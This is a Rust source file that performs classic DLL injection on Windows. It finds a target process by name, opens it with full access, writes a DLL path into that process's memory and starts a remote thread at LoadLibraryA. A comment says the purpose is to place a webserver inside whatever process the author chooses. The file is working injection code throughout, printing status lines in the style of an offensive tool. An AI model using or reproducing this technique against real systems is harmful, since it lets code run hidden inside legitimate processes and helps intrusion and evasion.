use std::{ffi::OsStr, ptr::null_mut,ffi::c_void};
use windows::core::PCSTR;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Memory::{ VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};


pub fn inject(processName: &str,dllPath:&str){
    let dllLen = dllPath.len();
    let pid = match find_first_by_name(OsStr::new(processName)){
        Ok(pid)=>pid,
        Err(())=>panic!("[!] Process Not Found"),
    };
    println!("[+] loaded at PID: {}",pid);
    unsafe{
        let process = match OpenProcess(PROCESS_ALL_ACCESS, false, pid){
            Ok(handle)=>handle,
            Err(E)=>panic!("[!] Could not open process"),
        };
        println!("[+] Opened Process");
        let buffer = VirtualAllocEx(process,None,dllLen,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    
        if buffer == null_mut(){
            panic!("[!] could not allocate buffer");
        }
        println!("[+] allocated buffer");
    
        let result = WriteProcessMemory(process,buffer,dllPath.as_ptr() as *const c_void,dllLen,None);
        match result{
            Ok(k)=>println!("Write Ok"),
            Err(e)=>panic!("Memory Write Failed"),
        }
        println!("[+] wrote memory");
        let kernel32 = match GetModuleHandleA(PCSTR("Kernel32.dll\0".as_ptr())){
            Ok(kernel32)=>kernel32,
            Err(E)=>panic!("[!] Could not get Kernel32"),
        };
       
        
        let loadLibAddr = GetProcAddress(kernel32, PCSTR("LoadLibraryA\0".as_ptr()));
        println!("[+] got loadLibraryA at {:#x}",std::mem::transmute::<Option<unsafe extern "system" fn()->_>,usize>(loadLibAddr));
        let thread = match CreateRemoteThread(process,None,0,std::mem::transmute(loadLibAddr),Some(buffer),0,None){
            Ok(thread)=>thread,
            Err(E)=>panic!("[!] thread failed"),
        };
        WaitForSingleObject(thread, INFINITE);
        CloseHandle(thread);
        CloseHandle(process);
    
    }
    }

    /**
 * function for finding a process name to put the webserver wherever I choose copied the code from a stack overflow thread 
 * many months ago for a previous project do not remember the thread and havent been able to find it
 */
fn find_first_by_name(processName:&OsStr)->Result<u32,()>{
    let mut system = sysinfo::System::new();
    system.refresh_all();
    let foundProcesses = system.processes_by_name(processName);
    for p in foundProcesses{
        return Ok(p.pid().as_u32())
    }
    Err(())
}